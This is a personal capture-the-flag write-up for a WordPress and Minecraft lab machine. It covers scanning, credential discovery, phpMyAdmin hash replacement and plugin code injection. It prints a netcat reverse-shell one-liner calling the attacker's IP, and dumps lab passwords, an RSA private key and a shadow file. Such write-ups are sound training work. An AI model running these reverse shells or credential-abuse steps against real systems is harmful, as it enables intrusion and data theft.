# Machine #9 Jarvis  


## Nmap Results  
  <img src="https://nmap.org/images/nmap-logo-256x256.png">   

* Initial nmap output  

  ```console
  PORT     STATE  SERVICE
  21/tcp   open   ftp
  22/tcp   open   ssh
  80/tcp   open   http
  8192/tcp closed sophos
  ```  

* Full scan output   

```console
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
80/tcp    open   http
8192/tcp  closed sophos
25565/tcp open   minecraft
```

<br/><br/>

## Banner Grabbing of Services  
 
 * The `Minecraft` service   
  ```console
  PORT      STATE SERVICE   VERSION
  25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
  ```

<br/><br/>

## Searchsploiting Results   
  <img src="https://www.offensive-security.com/wp-content/uploads/2020/05/SearchSploit-1.png" width=400 height=200>   



<br/><br/>  

## Gobustering Stuff  
  <img src="https://cdn.akamai.steamstatic.com/steam/apps/1092880/capsule_616x353.jpg?t=1605640630" width=400 height=200>  

  * Results   
    ```
    /index.php            (Status: 301) [Size: 0] [--> http://10.129.235.205/]
    /javascript           (Status: 301) [Size: 321] [--> http://10.129.235.205/javascript/]
    /phpmyadmin           (Status: 301) [Size: 321] [--> http://10.129.235.205/phpmyadmin/]
    /plugins              (Status: 301) [Size: 318] [--> http://10.129.235.205/plugins/]   
    /wiki                 (Status: 301) [Size: 315] [--> http://10.129.235.205/wiki/]      
    /wp-admin             (Status: 301) [Size: 319] [--> http://10.129.235.205/wp-admin/]  
    /wp-content           (Status: 301) [Size: 321] [--> http://10.129.235.205/wp-content/]
    /wp-includes          (Status: 301) [Size: 322] [--> http://10.129.235.205/wp-includes/]
    /wp-config.php        (Status: 200) [Size: 0]                                           
    /wp-login.php         (Status: 200) [Size: 2417]                                        
    /wp-trackback.php     (Status: 200) [Size: 135]                                         
    /xmlrpc.php           (Status: 405) [Size: 42]
    ```



<br/><br/>

## Thinking Out Loud   

  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQr4hzX6KoRN5PjPJjy8QC43K0T-CoXZHawDIxG4jCa9aMD1K8Vl3vhpG2a2OVbiy-i93c&usqp=CAU" width=200 height=200>  

* Found a login page when pressing "login" on the page.
* The website is using Wordpress which has a lot of security issues if not patched properly. I should look for a version
* Found the WordPress version `<generator>https://wordpress.org/?v=4.8</generator>`.
* This link shows multiple vulnerabilities for Wordpress version 4.8 <a href="https://wpscan.com/wordpress/48">click here</a>.
* I also found that there could be a potential sqli but tried it on multiple parameters and none worked out.
* The username is definitely "notch" but the password is my problem.
* Also found multiple vulnerabilities with the xmlrpc.php page but they're kind of irrelevant bacause it's either a DDoS attack or a Brute Force and I want to keep brute forcing as my last resort.
* Also, tried with the ftp but even if I was able to transfer files through it I don't think I can access files I transfered through the webpage.

* Found this username and password in the "Cute File Browser" that I got access to through the directory `plugins`  
root   8YsqfCTnvxAUeduzjNSXe22


/etc/php/7.0/mods-available/ftp.ini
/usr/share/php7.0-common/common/ftp.ini


* Hash cracker  
`john --incremental --stdout | python phpass_crack.py hashes.txt -vv -o cracked.txt`.

* So instead of trying to crack the hash an idea occured to me to change the whole hash into one that I know what it is and I found <a href="https://www.useotools.com/wordpress-password-hash-generator">this</a> which generates wordpress hashes that are hashed with Portable PHP password hashing framework and with that I got into the WordPress.


 exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.46  1234 >/tmp/f");

sudo rm /tmp/f;mkfifo /tmp/f; sudo cat /tmp/f|/bin/sh -i 2>&1| sudo nc 10.10.14.46  1234 >/tmp/f

 /etc/init.d/pro restart

* I got rev shell and it worked. I edited one of the plugins code and added the revshell code to it and when I saved my editing I got access as www-data. Make sure to not delete the original code of the plugin just add code for rev shell.
```console
define('DB_PASSWORD', 'kWuvW2SYsABmzywYRdoD');
define('DB_USER', 'wordpress');
```

```console
$dbpass='8YsqfCTnvxAUeduzjNSXe22';                                                                    
$dbuser='phpmyadmin';
    // $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
// $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
$cfg['Servers'][$i]['AllowNoPassword'] = false;
$cfg['Servers'][$i]['AllowNoPassword'] = false;
$cfg['Servers'][$i]['nopassword'] = false;
$cfg['ShowChgPassword'] = true;
        $pwd = trim( wp_unslash( $_POST[ 'pwd' ] ) );
        define('DB_PASSWORD', $pwd);
        define('DB_USER', $uname);
define('DB_PASSWORD', 'password_here');
define('DB_USER', 'username_here');
define('DB_PASSWORD', 'kWuvW2SYsABmzywYRdoD');
define('DB_USER', 'wordpress');

#-----------------------------------

-rw-r--r-- 1 root root 69 May 11  2017 /etc/php/7.0/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 May 11  2017 /usr/share/php7.0-common/common/ftp.ini
```


* Seems like there's a screen open by notch. Not sure
```console
[*] sof150 Are there any screen sessions from other users?................. yes!
---
/run/screen/S-notch

```

* Process that is executed by notch with a command that does not exist. Maybe I can make my own "SCREEN"   
  ```console
  05:05     1209    notch SCREEN screen -dmS blockycraft java -Xms500M -Xmx500M -jar ./sponge.jar nogui
  ```
* That was a false call
* /tmp/tmux-33
* /usr/bin/gettext.sh

## How Did I Solve the Machine 

   <img src="https://images.lifesizecustomcutouts.com/image/cache/catalog/febProds21/SP000081-500x500.png" width=200 height=200>   

* A kernel exploit worked just fine with me because the kernel version is so old but that was not the intended way.
* The intended way of solving it:  
  1. After exploring the website and gobustering the directories that are available I found a directory called `/plugins` which had files that exposed a password that had a username called root.
  2. Obviously I first tried these creds on the `phpmyadmin` page because I once read that it usually has a default username of root and it worked I got into the phpmyadmin page.
  3. Given the fact that the phpmyadmin page is used to administrate (No better word came to my mind) a mysql database I was able to access the wp database and specifically the user, notch's, password. 
  4. But it was encrypted, which was not a problem because I had the privilege to edit the database and it was known that wordpress encrypts its passwords with two ways: the old way which is md5 which seems like it was not the case here, or using Portable php hashing (Sorry I meant hashing not encrypting).
  5. I generated a new hash with the help of an online tool that generates portable php hashes and replaced the password and as simple as that I got into the wordpress.
  6. The wp page was veeeery slow but it was obvious that I needed to open the plugins page and try to create or edit a plugin. The create page didn't work out with me but editing was just fine.
  7. So I injected php code inside one of the plugins then activated it and just like that I had a rev shell BUT with www-data privilege.  
  8. Next I needed to priv esc, although I used a kernel exploit that got me root in seconds (after I tried one that crashed the system) that was not the intended way.
  9. The intended way was waay easier. I had notch's password all along I don't know why I didn't try it which was the intended way.
  10. Once you get notch he has the ability to sudo and we found that out when we view notch's home and found the file .sudo_to_admin or sth like that.
  11. Get a sudo reverse shell? I think this should get me root.


## Where I Got Stuck?   

* I HAD THE PASSWORD ALL ALONG!!
* That I didn't try to use the password that I have to `su` as notch.
* I had the password all along. I kept seeing it in the linpeas scan with another password but didn't even once think to try it.
* So yeah I need to permute the passwords and usernames I find.

## What Did I learn from this Machine?  

### Weak Passwords and Password Reusing
* If I find a password to try it anywhere and everywhere.

### Username Enumeration  
* On the login screen when the user enters the wrong password, as a developer of the website, I shouldn't show any indication that the user exists. The error message on the login page helped me with knowing that I was entering the right user for sure and it's just figuring out the password what is left.

### Least Privilege   
* I guess we shouldn't give users the ability to access the phpmyadmin page, because even when I got the password I couldn't have been able to use it anywhere if it wasn't for my access to the phpmyadmin that gave me access to the database to change notches password because I had full privileges to edit the database eventhough the password was encrypted with the portable php format hashing.   
* I think we can also say that I shouldn't have been able to access the "Cute file explorer" or whatever it's name was because it definitly exposed me to the password.  


  <blockquote>
  You can limit access to the phpMyAdmin interface to specific machines by editing the apache.conf file
  </blockquote>    

### Can I consider "Old Kernel Version" ?

* KeepItSimpleStupid.   


nc -z -v localhost 20-80 2>&1 | grep succeeded




private.key rsa

IIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCdud3PmuhCGcNFs7XEcA9+Xw9O9fuRW3gadiat+4vn3bizihuy/ZsI8ZBsM5Ngw+hK/U6kho//fo0fzj2qn4BqVBAzdDShTu8Qnmo/lyjrTcAfGXbakPblNs0YhG0JpydtGbA+q3jckqHO7hlF/DvXROOdfxlaZM93Dvj1xcz1o21AzoR64fGqbHSF2hH3TH2nJ74HmTNv597Vgpy7XbcPrGl+PoMc0h1MgV+KR3uQiAPg67gCZ4u3xHpa6cg/18XIfijX5FLj9wsuQDgfuSKd2EheEVHBTKIKPnDc+Yb/8D/L6tCEUnM0YTALXiSdwrSHLvy4b77z7l8W8N5Wc3N5AgMBAAECggEAahJXc4iv7dQ5mKSU9ziNkuUG/Ik817J2AQW4WYUzv4lC76tPmX4oR0l9YOcGlCrsC5Jy0v6T1LUc32jp29dMmzVRd+kMg/b7m2eN+JoFsMknDUMoxTB8egXyxCw60CUTxLFj76GNtHkATJOfd4t8CvePQ5n4SOxHAcCV+WM+xWpDaAJuPBT2ffdw1gnNnFaEp7ryRowNvXCDR49Z2CORiEeX/ICdiKVcDH5Vtl49n2wJk2qv/HJpFZvwVOTCneDeCcEBoXeOojEaDggbsxPjFPfMG8Zo4bOjAu869Afc+b5Ixrcy5ktJUZqdGT+xoHuUsYs2/FWReN0yYJ73ipvYCQKBgQDp49n7jZuuKv6k86m936/44xARZlTagOQmyqsfxmaFZ97Pr8fJrMufv5RN/eHEIcOaZfNwII7fyeDOAjp+HOX0OueR/3AI+Zr15SEL713BEnbytlZCoH0ebvoCNlUgk8L54WsdoQqPu/wLGTZfcFdSkMRUHP1/LQdj+/efq84WvwKBgQCsotfOFyhkumV3HKhbBtMH1lJT4V3hJ87G4GnXITG7qgzdT7KNAe1wxdilHOY4z61A/7a7Ao6a/ecrlKfzWufl9dHoiESc2XVw9YO3wheqZnTy+/8DgrzIm221HH16VgobIBxRrmBv6ZzyjYyNfzfX9bJppYnAR5/a/1090i57xwKBgAwFEabD2ERTIVMI0qhXXovD34eFYsb36MG1mKXBZHNmqySxO+s5Xh2PkuePLJMPySWeJ6yTf8Qwc8UiiC8C/S5X+J6gKfnMGhKY++HJI2BQupwukrBJ3yQ5P8/tSuKptVNyKjcTl59bYdCQMyMkethbaDuKYdyvS7nvsQIbqjOxAoGBAJdhhFNXwzfwqyCzpH2NkmeA7FhZevUA7zU9fBIFLZMeHoHCbRNw6UDGfJ7spISUt5wTn6yFJX+LvbZdeJjQ0iC4WgTJ2UCg/3a6E3KDZDUr+slHZ+swLVLL2HvEK9Omtt3qXmrRugbol5Opw+If+FwLOxOg8RYGuIpU+vJG6DPpAoGBANSVjA1DF6NJWuMdi6uWuQr0iEvNPAm7V7MJ+LcvlzRn2N1VRL4iAEV4Ijk7yVNx7xtAbPcs5WH8iGP8gNDDUUnv30hgHY+J9H8wfCtIpzvoBMiw5Gt1kWyK4e4hKdFnNxaXt4p/5sNeA4PM8EeEwL/rKNxzVXjicQqRE3YZZSiB  



public.key   

MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnbndz5roQhnDRbO1xHAPfl8PTvX7kVt4GnYmrfuL5924s4obsv2bCPGQbDOTYMPoSv1OpIaP/36NH849qp+AalQQM3Q0oU7vEJ5qP5co603AHxl22pD25TbNGIRtCacnbRmwPqt43JKhzu4ZRfw710TjnX8ZWmTPdw749cXM9aNtQM6EeuHxqmx0hdoR90x9pye+B5kzb+fe1YKcu123D6xpfj6DHNIdTIFfikd7kIgD4Ou4AmeLt8R6WunIP9fFyH4o1+RS4/cLLkA4H7kindhIXhFRwUyiCj5w3PmG//A/y+rQhFJzNGEwC14kncK0hy78uG++8+5fFvDeVnNzeQIDAQAB   



$6$xyz$WwFC0nTow5jwJwMYeOZItipYgZidye/O7Z2kxRP3cPttku.GHre0y/51bO2uJlRjQwLNRddSA5fuJG5X1F8Dd1

root:$6$xyz$WwFC0nTow5jwJwMYeOZItipYgZidye/O7Z2kxRP3cPttku.GHre0y/51bO2uJlRjQwLNRddSA5fuJG5X1F8Dd1:18410:0:99999:7:::
daemon:*:17212:0:99999:7:::
bin:*:17212:0:99999:7:::
sys:*:17212:0:99999:7:::
sync:*:17212:0:99999:7:::
games:*:17212:0:99999:7:::
man:*:17212:0:99999:7:::
lp:*:17212:0:99999:7:::
mail:*:17212:0:99999:7:::
news:*:17212:0:99999:7:::
uucp:*:17212:0:99999:7:::
proxy:*:17212:0:99999:7:::
www-data:*:17212:0:99999:7:::
backup:*:17212:0:99999:7:::
list:*:17212:0:99999:7:::
irc:*:17212:0:99999:7:::
gnats:*:17212:0:99999:7:::
nobody:*:17212:0:99999:7:::
systemd-timesync:*:17212:0:99999:7:::
systemd-network:*:17212:0:99999:7:::
systemd-resolve:*:17212:0:99999:7:::
systemd-bus-proxy:*:17212:0:99999:7:::
syslog:*:17212:0:99999:7:::
_apt:*:17212:0:99999:7:::
lxd:*:17349:0:99999:7:::
messagebus:*:17349:0:99999:7:::
uuidd:*:17349:0:99999:7:::
dnsmasq:*:17349:0:99999:7:::
notch:$6$RdxVAN/.$DFugS5p/G9hTNY9htDWVGKte9n9r/nYYL.wVdAHfiHpnyN9dNftf5Nt.DkjrUs0PlYNcYZWhh0Vhl/5tl8WBG1:17349:0:99999:7:::
mysql:!:17349:0:99999:7:::
proftpd:!:17349:0:99999:7:::
ftp:*:17349:0:99999:7:::
sshd:*:17349:0:99999:7:::